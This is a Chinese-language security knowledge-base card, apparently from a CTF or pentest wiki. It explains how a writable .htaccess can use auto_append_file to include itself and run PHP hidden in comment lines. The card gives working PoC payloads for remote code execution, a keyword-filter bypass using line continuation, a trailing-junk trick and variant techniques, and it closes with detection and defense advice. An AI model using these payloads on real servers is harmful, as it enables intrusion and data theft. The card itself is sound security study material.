---
id: web-php-file-inclusion-htaccess-self-include-dirty-bypass
title: .htaccess auto_append_file 自包含执行注释内 PHP 并容忍尾随脏字符
type: scenario
domain: web
path: web/php/file-inclusion
technique: htaccess-self-include-dirty-bypass
tags:
- php
- apache
- htaccess
- file-inclusion
- rce
- filter-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:39:49+08:00'
  notes: '已对照原文与图11/12/54核对：php_value auto_append_file .htaccess 配 # <?php phpinfo(); ?> 自包含执行；图54 证实 php_value auto_append_fi 反斜杠续行 le .htaccess、#<?php echo 反引号cat /* 反引号;?>、结尾 #\ 注释掉追加的 Just one chance 并读出 flag。卡片 PoC 与原文一致。原文测试环境 PHP 8.5.0RC3、Apache 2.4.65，非受影响区间，未设置 versions。PoC 未在本机执行。'
url: /docs/web/php/file-inclusion/web-php-file-inclusion-htaccess-self-include-dirty-bypass/
draft: false
kb_aliases:
- .htaccess 自包含
- auto_append_file .htaccess
- auto_prepend_file .htaccess
- 反斜杠续行
- '#\ 注释尾随垃圾'
- Just one chance
---

## 一句话结论

只看得到“写文件”一个入口、无法另传 PHP 脚本时，可在写入的 `.htaccess` 里设置 `auto_append_file .htaccess`，让 PHP 把 `.htaccess` 自己当作被包含文件执行；`# <?php ... ?>` 这行对 Apache 是注释、对 PHP 却是可执行代码。配合 `\` 续行拆分关键字、`#\` 注释掉应用追加的尾部垃圾，可在过滤与“写后追加”场景下稳定落地 RCE。

## 原理

- mod_php 下 `.htaccess` 的 `php_value auto_append_file <file>` 会让每个 PHP 请求在脚本执行后自动包含指定文件。若指向 `.htaccess` 自身，PHP 会把整份配置文件当 PHP 代码编译，其中 `<?php ... ?>` 片段被执行。
- `.htaccess` 同时是 Apache 配置和普通文件：`#` 开头的行被 Apache 忽略，但 PHP 解析时 `#` 不是 PHP 注释，`<?php` 片段照常执行。因此同一份文件既能承载配置，又能承载 payload，无需第二个可写文件。
- Apache 配置支持行尾 `\` 续行：把 `auto_append_file` 拆成 `auto_append_fi\` 换行 `le`，可以绕过对关键字的字符串黑名单（例如禁 `file`/`htaccess` 的过滤）。
- 若写入接口在内容末尾追加固定文本（本例追加 `\nJust one chance`），直接在末尾写 payload 会让配置语法错误并 500。用 `#\` 结尾：`#` 开始注释、`\` 使注释延续到下一行，从而把应用追加的垃圾一并注释掉。

## 触发条件

- Apache + mod_php，目标目录 `AllowOverride` 允许 `FileInfo`/`Options`（`php_value` 生效）；
- 攻击者能写入 `.htaccess`（上传、任意文件写、配置注入等），但可能受关键字/内容过滤或尾部追加限制；
- 同目录存在可请求的 PHP 脚本以触发 auto_append；PHP 对 `.htaccess` 有读权限；
- `.htaccess` 能被相对路径 `include_path` 找到（同目录默认满足）。

## 利用步骤

1. 确认可写 `.htaccess` 且 PHP 配置生效；确认目录内有可访问的 PHP 页面。
2. 写入 `php_value auto_append_file .htaccess`，并把 PHP payload 放在 `#` 注释行内。
3. 若过滤关键字，用 `\` 续行拆分指令名。
4. 若写入后应用追加垃圾，末尾加 `#\` 注释掉后续行。
5. 请求任意 PHP 页面，`auto_append` 包含 `.htaccess` 并执行 payload。

## PoC

基础形式：

```apache
php_value auto_append_file .htaccess
# <?php phpinfo(); ?>
```

带续行与尾随垃圾（写入接口会在末尾追加 `Just one chance`）：

```apache
php_value auto_append_fi\
le .htaccess
#<?php echo `cat /*`;?>
#\
```

请求：

```bash
curl -s 'http://target/index.php'
```

## 变体与关联

- `auto_prepend_file` 同样可自包含，执行时机在脚本前；`auto_append_file` 在脚本后（脚本 `exit` 则不执行）。
- 若 payload 被 WAF 拦 `<?`/`php`，可用 `php://filter/convert.base64-decode/resource=.htaccess` 或短标签 `<?=...?>`。
- 与 `.user.ini` 的 auto_prepend 卡片互补：`.user.ini` 用于 Nginx + PHP-FPM；本卡用于 mod_php 且只有 `.htaccess` 一个写点。
- 与 `.htaccess` handler 覆盖、ErrorDocument 文件读取同属“可写 .htaccess”攻击面。
- 关联：PHP 错误日志写马（应用会追加/覆盖时改走日志）。

## 检测与防御

- 生产环境 `AllowOverride None`，禁止上传点接受 `.htaccess`/`.user.ini` 等点文件；上传目录禁止 PHP 执行。
- 监控 `.htaccess` 中出现 `auto_append_file`、`auto_prepend_file`、`php_value`、`#\`、行尾续行等特征。
- 写入接口避免把用户内容与固定后缀拼接后直接落盘；对点文件、配置文件名做黑名单并规范化路径。
- 以 `php_admin_value` 固定 `auto_prepend_file`/`auto_append_file`（空值），防止用户级配置覆盖；定期扫描 Web 目录中的异常 `.htaccess`。
